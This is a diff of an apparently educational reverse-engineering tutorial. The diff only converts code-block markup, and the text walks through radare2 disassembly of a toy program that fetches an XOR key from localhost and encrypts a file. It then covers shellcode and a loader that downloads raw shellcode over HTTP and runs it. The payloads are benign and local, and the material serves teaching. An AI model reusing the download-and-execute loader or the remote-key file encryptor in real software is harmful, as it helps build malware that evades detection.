@@ -21,7 +21,7 @@ So in this following example I wrote a very simple program that will retrieve a 
 _I need to say that I do not encourage you to write ransomware or any kind of malware, you may face legal consequences if you do it_
 
 Here's the code:
-<pre><code class="language-c">
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <netdb.h>
@@ -109,13 +109,13 @@ int main(int argc, char *argv[]) {
    crypFile("sample.txt",key);
    return 0;
 }
-</code></pre>
+```
 
 As you see the algorithm is simple, first we ask the remote server for the key, then the server will return a response containing data related to the status of the request like http headers and such, then the body will contain the k tagged key, so we'll need to parse it, getKey will extract the key and tne crypFile will use it to xor the file in chunks of key size.
 
 We start with the main function as usual:
 
-<pre><code class="language-c">
+```c
 [0x55fa6e273bc4]> pdf
             ; DATA XREF from entry0 @ 0x55fa6e2738dd
 ┌ 614: int main (int argc, char **argv, char **envp);
@@ -205,12 +205,12 @@ We start with the main function as usual:
 │           0x55fa6e273d3a      8b8570feffff   mov eax, dword [var_190h]
 │           0x55fa6e273d40      ba10000000     mov edx, 0x10           ; 16
 │           0x55fa6e273d45      4889ce  
-</code></pre>
+```
 Again this is very similar to what we saw on the previous tutorial.
 
 The program starts by loading the get request string
 
-<pre><code class="language-c">
+```c
 │           0x55fa6e273beb      48b847455420.  movabs rax, 0x79656b2f20544547 ; 'GET /key'
 │           0x55fa6e273bf5      48ba2e747874.  movabs rdx, 0x545448207478742e ; '.txt HTT'
 │           0x55fa6e273bff      488985a0feff.  mov qword [var_160h], rax
@@ -232,18 +232,18 @@ The program starts by loading the get request string
 │           0x55fa6e273c84      c785e8feffff.  mov dword [var_118h], 0xd0a0d2a
 │           0x55fa6e273c8e      66c785ecfeff.  mov word [var_114h], 0xa
 │           0x55fa6e273c97      c7856cfeffff.  mov dword [var_194h], 0x50 ; 'P' ; 80
-</code></pre>
+```
 So the string gets loaded well in memory:
-<pre><code class="language-c">
+```c
 [0x55fa6e273cb0]> pxw @ 0x7ffc9a81e5c0
 0x7ffc9a81e5c0  0x20544547 0x79656b2f 0x7478742e 0x54544820  GET /key.txt HTT
 0x7ffc9a81e5d0  0x2e312f50 0x550a0d31 0x2d726573 0x6e656741  P/1.1..User-Agen
 0x7ffc9a81e5e0  0x6e203a74 0x2e302f63 0x0d312e30 0x736f480a  t: nc/0.0.1..Hos
 0x7ffc9a81e5f0  0x31203a74 0x302e3732 0x312e302e 0x63410a0d  t: 127.0.0.1..Ac
 0x7ffc9a81e600  0x74706563 0x2f2a203a 0x0d0a0d2a 0x0000000a  cept: */*.......
-</code></pre>
+```
 Then comes the socket creation and initialization through connect
-<pre><code class="language-c">
+```c
            0x55fa6e273cb0 b    e8ebfbffff     call sym.imp.socket     ; int socket(int domain, int type, int protocol)
 │           0x55fa6e273cb5      898570feffff   mov dword [var_190h], eax
 │           0x55fa6e273cbb      488d3dfe0100.  lea rdi, str.127.0.0.1  ; 0x55fa6e273ec0 ; "127.0.0.1"
@@ -252,17 +252,17 @@ Then comes the socket creation and initialization through connect
 │           0x55fa6e273cce      488d8580feff.  lea rax, [var_180h]
 │           0x55fa6e273cd5      be10000000     mov esi, 0x10           ; 16
 │           0x55fa6e273cda      4889c7         mov rdi, rax
-</code></pre>
+```
 As well as the buffer initialization with bzero, nothing much to comment.
 
 Then the read from the server:
-<pre><code class="language-c">
+```c
 │           0x55fa6e273dd5      e856faffff     call sym.imp.read       ; ssize_t read(int fildes, void *buf, size_t nbyte)
 │           ;-- rip:
 │           0x55fa6e273dda b    898574feffff   mov dword [var_18ch], eax
-</code></pre>
+```
 So after the read we see the key has been delivered:
-<pre><code class="language-c">
+```c
 [0x55fa6e273dda]> pxw @ 0x7ffc9a81e610
 0x7ffc9a81e610  0x50545448 0x312e312f 0x30303220 0x0d4b4f20  HTTP/1.1 200 OK.
 0x7ffc9a81e620  0x7461440a 0x54203a65 0x202c7568 0x4a203430  .Date: Thu, 04 J
@@ -280,9 +280,9 @@ So after the read we see the key has been delivered:
 0x7ffc9a81e6e0  0x65707954 0x6574203a 0x702f7478 0x6e69616c  Type: text/plain
 0x7ffc9a81e6f0  0x0a0d0a0d 0x303e6b3c 0x34333231 0x38373635  ....<k>012345678
 0x7ffc9a81e700  0x6b2f3c39 0x00000a3e 0x00000000 0x00000000  9</k>...........
-</code></pre>
+```
 Bus as said, the server included http headers and useless information, we proceed to parse the key:
-<pre><code class="language-c">
+```c
 [0x55fa6e2739ca]> pdf
             ; CALL XREF from main @ 0x55fa6e273df4
             ;-- rip:
@@ -358,10 +358,10 @@ Bus as said, the server included http headers and useless information, we procee
 │           0x55fa6e273a8e      5d             pop rbp
 └           0x55fa6e273a8f      c3             ret
 [0x55fa6e2739ca]> 
-</code></pre>
+```
 Getkey function is a bit chaotic but let's focus on the relevant stuff.
 
-<pre><code class="language-c">
+```c
 │      ╎│   0x55fa6e2739fd      0fb600         movzx eax, byte [rax]
 │      ╎│   0x55fa6e273a00      3c3c           cmp al, 0x3c            ; 60
 │     ┌───< 0x55fa6e273a02      7572           jne 0x55fa6e273a76
@@ -381,14 +381,14 @@ Getkey function is a bit chaotic but let's focus on the relevant stuff.
 │    ││╎│   0x55fa6e273a2b      0fb600         movzx eax, byte [rax]
 │    ││╎│   0x55fa6e273a2e      3c3e           cmp al, 0x3e            ; 62
 │   ┌─────< 0x55fa6e273a30      7544           jne 0x55fa6e273a76
-</code></pre>
+```
 The program enters inside a loop going char by char on the buffer, then compares the actual character with 60 ='<'. Then it will compare the next 2 characters after it with 'k' and '>' It'll loop ten times extracting the key and thus it will be updated after the return through local var_10h
-<pre><code class="language-c">
+```c
 [0x55fa6e273bc4]> pxw @ 0x7ffc9a81e5b5
 0x7ffc9a81e5b5  0x33323130 0x37363534 0x47003938 0x2f205445  0123456789.GET /
-</code></pre>
+```
 Then the crypt function, I won't get into a lot of detail on it as we already saw it on previous tutorials in this course. So crypfile opens the file and goes chunk by chunk reading/xoring/writting.
-<pre><code class="language-c">
+```c
            0x55fa6e273b38      e823fdffff     call sym.imp.open       ; int open(const char *path, int oflag)
 │           0x55fa6e273b3d      8945e8         mov dword [var_18h], eax
 │       ┌─< 0x55fa6e273b40      eb2e           jmp 0x55fa6e273b70
@@ -414,9 +414,9 @@ Then the crypt function, I won't get into a lot of detail on it as we already sa
 │      ╎    0x55fa6e273b86      e8a5fcffff     call sym.imp.read       ; ssize_t read(int fildes, void *buf, size_t nbyte)
 │      ╎    0x55fa6e273b8b      85c0           test eax, eax
 │      └──< 0x55fa6e273b8d      75b3           jne 0x55fa6e273b42
-</code></pre>
+```
 And cryp goes char by char KSIZE chars and does the XOR with the key
-<pre><code class="language-c">
+```c
 │      ┌──> 0x00000aa5      8b45fc         mov eax, dword [var_4h]
 │      ╎│   0x00000aa8      4863d0         movsxd rdx, eax
 │      ╎│   0x00000aab      488b45e0       mov rax, qword [var_20h]
@@ -438,7 +438,7 @@ And cryp goes char by char KSIZE chars and does the XOR with the key
 │      ╎│   ; CODE XREF from sym.cryp @ 0xaa3
 │      ╎└─> 0x00000adc      837dfc0a       cmp dword [var_4h], 0xa
 │      └──< 0x00000ae0      7ec3           jle 0xaa5
-</code></pre>
+```
 Voilà!
 
 Let's now move into a new topic that I think may be of great interest.
@@ -450,7 +450,7 @@ Let's now move into a new topic that I think may be of great interest.
 This post is not about shellcode writting, we'll go over that after some tutorials though. In here we'll just introduce you to a new concept linked to the socket topic whe are dealing wiht.
 
 Let's start with this very simple program:
-<pre><code class="language-c">
+```c
 #include <stdio.h>
 
 void hello(){
@@ -461,9 +461,9 @@ void hello(){
 void main(){
     hello();
 }
-</code></pre>
+```
 It contains a couple of functions right. One is the classical main function, the other one just prints the hello world. Let's inspect this second one:
-<pre><code class="language-c">
+```c
 [0x7f4653774090]> s sym.hello
 [0x5561e0c6c6aa]> pdf
             ; CALL XREF from main @ 0x5561e0c6c707
@@ -492,7 +492,7 @@ It contains a couple of functions right. One is the classical main function, the
 │       └─> 0x5561e0c6c6fc      c9             leave
 └           0x5561e0c6c6fd      c3             ret
 [0x5561e0c6c6aa]> 
-</code></pre>
+```
 As you can see, everyting is kind of "self-contained" inside this function. The string is "generated" and loaded inside the function, original register/stack values regarding to the calling block of code are kept/restored and calls (to printf) reference symbols that will be "common" in unix systems...
 
 As you see the string is self generated in memory, would it be any way to self generate actual code in memory in a similar way?
@@ -502,7 +502,7 @@ _indeed_
 If you look at the disasm, you'll see the opcodes right in the second column, that is essence of the binary program, that is what the "cpu" sees and deals with, so if we can just set a buffer containing the right set of opcodes in memory and manage to move the execution pointer there, common sense tells us that those will be executed as actual code. Again, we'll go in-depth on the topic further in the course but I think you get the main idea now.
 
 Let's look at one simple example then go back to our hello world
-<pre><code class="language-c">
+```c
 #include <stdio.h>
 #include<string.h>
 #include <stdint.h>
@@ -518,9 +518,9 @@ void main(){
     (int)(*func)();
     
 }
-</code></pre>
+```
 So this program declares an array of (hex) bytes then declares a magic function that will basically set the instruction pointer at the beginning of the array. Let's see it inside r2, it will make more sense.
-<pre><code class="language-c">
+```c
 [0x557a8fb295fa]> pdf
             ; DATA XREF from entry0 @ 0x557a8fb2950d
 ┌ 33: int main (int argc, char **argv, char **envp);
@@ -537,17 +537,17 @@ So this program declares an array of (hex) bytes then declares a magic function 
 │           0x557a8fb29619      c9             leave
 └           0x557a8fb2961a      c3             ret
 [0x557a8fb295fa]> 
-</code></pre>
+```
 If you know a bit about asm and opcodes you'll see that 0x90 is the opcode for the nop instruction, the nop instruction simply does nothing.
 
 The program starts by moving the pointer to an address to rax = 0x557a8fb296a4
-<pre><code class="language-c">
+```c
 [0x557a8fb295fa]> pxw @ 0x557a8fb296a4
 0x557a8fb296a4  0x90909090 0x3b031b01 0x0000003c 0x00000006  .......;<.......
-</code></pre>
+```
 And that contains our nop-buffer. After a couple of instructions the programm will jump there by a call.
 
-<pre><code class="language-c">
+```c
 │           ;-- rip:
 │           0x557a8fb29616 b    ffd2           call rdx
 │           0x557a8fb29618      90             nop
@@ -555,9 +555,9 @@ And that contains our nop-buffer. After a couple of instructions the programm wi
 └           0x557a8fb2961a      c3             ret
 [0x557a8fb29616]> dr rdx
 0x557a8fb296a4
-</code></pre>
+```
 And as the bytes of our hex buffer can easily be translated to instructions, the program will "read it" as executable code as you see here:
-<pre><code class="language-c">
+```c
 [0x557a8fb29616]> ds
 [0x557a8fb296a4]> pd 10
             ; DATA XREF from main @ 0x557a8fb29602
@@ -575,14 +575,14 @@ And as the bytes of our hex buffer can easily be translated to instructions, the
             0x557a8fb296a8      011b           add dword [rbx], ebx    ; [16] -r-- section size 60 named .eh_frame_hdr
             0x557a8fb296aa      033b           add edi, dword [rbx]
             0x557a8fb296ac      3c00           cmp al, 0
-</code></pre>
+```
 Nops will be executed and then the weird add dword [rbx], ebx  that corresponds to some weird memory initialization will be executed, as the code below there does not make any sense because of that, the program will likely crash, but you get the point right? What if we manage to create an hex buffer that actually represents a valid function, a function that gets rid of the stack and returns to the calling one?
 
 Let's do it so,
 
 As in the previous program the hello function was somehow "self-contained" we can "convert-it into shellcode"
 
-<pre><code class="language-c">
+```c
 [0x55ef096056aa]> pdf
             ; CALL XREF from main @ 0x55ef09605707
 ┌ 84: sym.hello ();
@@ -610,9 +610,9 @@ As in the previous program the hello function was somehow "self-contained" we ca
 │       └─> 0x55ef096056fc      c9             leave
 └           0x55ef096056fd      c3             ret
 [0x55ef096056aa]> 
-</code></pre>
+```
 Once inside it in r2 we'll use pc
-<pre><code class="language-c">
+```c
 [0x55ef096056aa]> pc
 #define _BUFFER_SIZE 256
 const uint8_t buffer[_BUFFER_SIZE] = {
@@ -643,12 +643,12 @@ const uint8_t buffer[_BUFFER_SIZE] = {
   0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xcc, 0xfd, 0xff, 0xff,
   0x8c, 0x00, 0x00, 0x00, 0xfc, 0xfd
 };
-</code></pre>
+```
 That will return a buffer containing the function-shellcode to us so we can use it in our _evil activities_
 
 Inside the code will work like this
 
-<pre><code class="language-c">
+```c
 #include <stdio.h>
 #include<string.h>
 #include <stdint.h>
@@ -690,10 +690,10 @@ void main(){
     func = (int (*)()) buffer;
     (int)(*func)();
 }
-</code></pre>
+```
 And inside r2 will go like this:
 
-<pre><code class="language-c">
+```c
 [0x5606c6856704]> pdf
             ; DATA XREF from entry0 @ 0x5606c68565bd
 ┌ 33: int main (int argc, char **argv, char **envp);
@@ -710,10 +710,10 @@ And inside r2 will go like this:
 │           0x5606c6856723      c9             leave
 └           0x5606c6856724      c3             ret
 [0x5606c6856704]> 
-</code></pre>
+```
 Same thing at start then the call:
 
-<pre><code class="language-c">
+```c
 [0x556afbdba800]> pd 10
             ; DATA XREF from main @ 0x556afbdba70c
             ;-- buffer:
@@ -727,7 +727,7 @@ Same thing at start then the call:
             0x556afbdba815      31c0           xor eax, eax
             0x556afbdba817  ~   48b848656c6c.  movabs rax, 0x7266206f6c6c6548 ; 'Hello fr'
             ;-- str.Hello_frH:
-</code></pre>
+```
 There will be our code, running the program will output a "hello friend" without crashing.
 
 #### Downloading shellcode
@@ -735,25 +735,25 @@ There will be our code, running the program will output a "hello friend" without
 So the smart reader may be probably thinking that as we only need those bytes in a buffer inside memory we can get them from a file or perhaps from a remote server and yes, that technique is commonly used by malware to avoid certain detection mechanisms.
 
 Say we have some code like this:
-<pre><code class="language-c">
+```c
 int main() {
   write (1,"Hello!\n",7);
   exit(0);
 }
-</code></pre>
+```
 It can be as simple or as complex as you want to, the only requisite for it is to be "self-contained" (or to set fixes on the host program) and we want to deliver it to a potential host that is "waiting for him" over the internet. We already know how to get and run it on the host program but how do we translate it into opcodes and deliver it over the network?
 
 We can get those opcodes by using *ragg2* and then dump them into an hex file:
 
-<pre><code class="language-c">
+```c
 :~/C$ 
 :~/C$ ragg2-cc  -x w.c
 eb0848656c6c6f210a00bf01000000488d35ecffffffba07000000b8010000000f0531ffb83c0000000f0531c0c3
-</code></pre>
+```
 So now we can simply copy and paste this and use hexedit to create a new file and hex-paste it, then we'll have our bin sc file ready to be delivered by using our favorite http server (or whatever else)
 
 The dump will look like this inside r2:
-<pre><code class="language-c">
+```c
 [0x00000000]> pd 50
             ;-- rflags:
 ┌ 38: fcn.00000000 ();
@@ -775,13 +775,13 @@ The dump will look like this inside r2:
             0x0000002a      6f             outsd dx, dword [rsi]
             0x0000002b      210a           and dword [rdx], ecx
             0x0000002d      00ff           add bh, bh
-</code></pre>
+```
 As you see, in here we are directly dealing with syscalls (see the syscall instruction), also note that we have two of them one for print one for exit and the string is somehow selfcontained within the code.
 
 
 Let's go for the host programnow, it will look similar as the previous http client we messed with:
 
-<pre><code class="language-c">
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <netdb.h>
@@ -830,12 +830,12 @@ int main(int argc, char *argv[]) {
 
    return 0;
 }
-</code></pre>
+```
 That'll be it, our small int func buffer routine has been added at the end and this time we are not reading a string but some executable bytes.
 
 This time as I don't want to over-complicate the example I won't use a web server like apache2, I'll use the netcat software to "emulate" a web server for this single request as follows:
 
-<pre><code class="language-c">
+```c
 :/var/www/html$ sudo nc -lvp 80 < sh 
 Listening on [0.0.0.0] (family 0, port 80)
 Connection from localhost 36428 received!
@@ -843,21 +843,21 @@ GET /sh HTTP/1.1
 User-Agent: nc/0.0.1
 Host: 127.0.0.1
 Accept: */*
-</code></pre>
+```
 being sh the RAW HEX shellcode. This command basically indicates netcat to just dump the (bytes) from that file to the first client connected to its port 80.
 
 Then running the progam will go like:
-<pre><code class="language-c">
+```c
 :~/C/generic$ gcc -w httpget_download_shellcode.c -o sh -fno-stack-protector -z execstack
 :~/C/generic$ ./sh 
 jumpting to shellcode
 Hello!
-</code></pre>
+```
 Note that I compiled the program using those flags, otherwise it won't work.
 
 Let's now analyze it:
 
-<pre><code class="language-c">
+```c
          0x55d39c38bac4      89c7           mov edi, eax
 │           0x55d39c38bac6      b800000000     mov eax, 0
 │           ;-- rip:
@@ -870,9 +870,9 @@ Let's now analyze it:
 │           0x55d39c38baea      488b55e0       mov rdx, qword [var_20h]
 │           0x55d39c38baee      b800000000     mov eax, 0
 │           0x55d39c38baf3      ffd2           call rdx
-</code></pre>
+```
 The buffer starts empty, as usual and then it will be filled with some good shellcode:
-<pre><code class="language-c">
+```c
 [0x55d39c38bacb]> afvd
 type:char ** doesn't exist
 arg argc = 0x00000003 0xffffffffffffffff   ........ @rdi 0
@@ -907,9 +907,9 @@ var var_20h = 0x7ffe72789660 = (qword)0x000055d39c38bb00
 0x7ffe72789540  0x00000000 0x00000000 0x00000000 0x00000000  ................
 0x7ffe72789550  0x00000000 0x00000000 0x00000000 0x00000000  ................
 0x7ffe72789560  0x00000000 0x00000000 0x00000000 0x00000000  ................
-</code></pre>
+```
 Then after the read call:
-<pre><code class="language-c">
+```c
 [0x55d39c38bacb]> dc
 hit breakpoint at: 55d39c38bad0
 [0x55d39c38bad0]> pxw @ 0x7ffe727894f0
@@ -917,11 +917,11 @@ hit breakpoint at: 55d39c38bad0
 0x7ffe72789500  0xb8000000 0x00000001 0xff31050f 0x00003cb8  ..........1..<..
 0x7ffe72789510  0x31050f00 0x6548c3c0 0x216f6c6c 0x0000000a  ...1..Hello!....
 0x7ffe72789520  0x00000000 0x00000000 0x00000000 0x00000000  ................
-</code></pre>
+```
 Here we have it here!
 
 Now at this point:
-<pre><code class="language-c">
+```c
 │           0x55d39c38baea      488b55e0       mov rdx, qword [var_20h]
 │           0x55d39c38baee      b800000000     mov eax, 0
 │           ;-- rip:
@@ -932,9 +932,9 @@ Now at this point:
 [0x55d39c38baf3]> dr rdx
 0x7ffe727894f0
 [0x55d39c38baf3]> 
-</code></pre>
+```
 And as we see if we use pd to dump those instructions there we see that they all make sense:
-<pre><code class="language-c">
+```c
 [0x559e09c42af3]> pd 20 @ 0x7ffe05af6b40
             ;-- rdx:
         ┌─< 0x7ffe05af6b40      eb00           jmp 0x7ffe05af6b42
@@ -952,7 +952,7 @@ And as we see if we use pd to dump those instructions there we see that they all
             0x7ffe05af6b69      6c             insb byte [rdi], dx
             0x7ffe05af6b6a      6f             outsd dx, dword [rsi]
             0x7ffe05af6b6b      210a           and dword [rdx], ecx
-</code></pre>
+```
 And that will be enough for today.
 
 On the next posts we'll go over some more advanced topics such as command and control mechanisms over DNS this time exploring the Windows API instead.
